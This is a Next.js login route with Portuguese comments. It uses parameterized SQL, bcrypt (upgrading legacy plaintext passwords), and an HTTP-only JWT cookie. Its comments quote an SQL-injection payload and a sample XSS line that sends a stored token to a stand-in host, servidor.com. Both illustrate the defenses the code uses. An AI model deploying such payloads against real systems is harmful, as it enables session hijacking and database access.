import { NextResponse } from "next/server";
import bcrypt from "bcryptjs";
import pool from "../../../../lib/db";
import { cookies } from "next/headers";
import { signJwt } from "../../../../lib/jwt";

// Valida o login, atualiza senhas antigas e cria a sessão JWT em cookie HTTP-only.
export async function POST(request) {
    try {
        const body = await request.json();
        const { identifier, password } = body; // 'identifier' pode ser o e-mail ou o nome de usuário

        if (!identifier || !password) {
            return NextResponse.json(
                { message: "Preencha todos os campos." },
                { status: 400 }
            );
        }

        // A consulta parametrizada usa $1 no lugar do texto recebido. Assim, o PostgreSQL
        // trata o valor somente como dado e impede que ele seja executado como SQL Injection.
        const result = await pool.query(
            "SELECT * FROM users WHERE email = $1 OR name = $1",
            [identifier]
            // Login com email e senha e o Identifier e $1 impede que um invasor manipule o banco de dados por inputs. Famoso SQL Injection. ' ' OR '1'='1', retornaria o primeiro usuario da tabela, o admin
        );

        // O JWT já protege os dados da sessão contra alterações. Se alguém mudar o papel
        // para ADMIN dentro do token, a assinatura deixa de ser válida e a sessão é recusada.
        if (result.rows.length === 0) {
            return NextResponse.json(
                { message: "Usuário ou senha incorretos." },
                { status: 401 }
            );
        }

        const user = result.rows[0];

        const savedPassword = String(user.password_hash || "");
        const passwordIsBcryptHash = savedPassword.startsWith("$2a$")
            || savedPassword.startsWith("$2b$")
            || savedPassword.startsWith("$2y$");

        // O bcrypt compara a senha sem descriptografar o hash salvo no banco.
        // Senhas antigas em texto puro são aceitas uma vez e logo em seguida criptografadas no banci de dados.
        let isPasswordValid = false;

        if (passwordIsBcryptHash) {
            isPasswordValid = await bcrypt.compare(password, savedPassword);
        } else {
            isPasswordValid = password === savedPassword;

            if (isPasswordValid) {
                const newPasswordHash = await bcrypt.hash(password, 10);

                await pool.query(
                    "UPDATE users SET password_hash = $1, updated_at = CURRENT_TIMESTAMP WHERE id = $2",
                    [newPasswordHash, user.id]
                );
            }
        }

        if (!isPasswordValid) {
            return NextResponse.json(
                { message: "Usuário ou senha incorretos." },
                { status: 401 }
            );
        }

        const publicUser = {
            id: user.id,
            name: user.name,
            email: user.email,
            role: user.role,
            status: user.status,
            created_at: user.created_at,
        };

        if (publicUser.status !== "ATIVO") {
            return NextResponse.json(
                { message: "Usuário sem permissão para acessar o sistema." },
                { status: 403 }
            );
        }

        const token = signJwt({
            id: publicUser.id,
            name: publicUser.name,
            role: publicUser.role,
            status: publicUser.status,
        });

        // Salva a sessão em um cookie HTTP-only, inacessível ao JavaScript da página.
        // O que um script malicioso faria se eu usasse localStorage:
        // fetch('https://servidor.com/log?cookie=' + localStorage.getItem('token'));
        // A maior ambição de um invasor ao explorar uma vulnerabilidade XSS é injetar um script JavaScript malicioso na página para roubar a sessão do usuário (fazer um Session Hijacking).
        const cookieStore = await cookies();
        cookieStore.set("schutz_session", token, {
            httpOnly: true, // impede acesso ao cookie via JavaScript, segurança contra ataques XSS
            // Quando você define httpOnly: true, você está dando uma ordem expressa ao navegador: "Este cookie só pertence ao protocolo HTTP/HTTPS. Nenhum script rodando no frontend tem permissão para lê-lo ou modificá-lo".
            secure: process.env.NODE_ENV === "production",  
            // secure: quando o marketplace Schutz for para a produção, esse cookie só será trafegado se a conexão for criptografada (HTTPS). Isso impede que ataques do tipo Man-in-the-Middle sniffem o tráfego da rede para roubar o cookie de sessão.
            sameSite: "lax", // reduz o envio do cookie em requisições iniciadas por outros sites (CSRF)
            maxAge: 60 * 60 * 24 * 7, // Sessão dura 7 dias
            path: "/",
        });

        return NextResponse.json(
            {
                message: "Login realizado com sucesso.",
                user: publicUser,
            },
            { status: 200 }
        );

    } catch (error) {
        console.error("Erro ao realizar login:", error);
        return NextResponse.json(
            { message: "Erro interno ao realizar login." },
            { status: 500 }
        );
    }
}
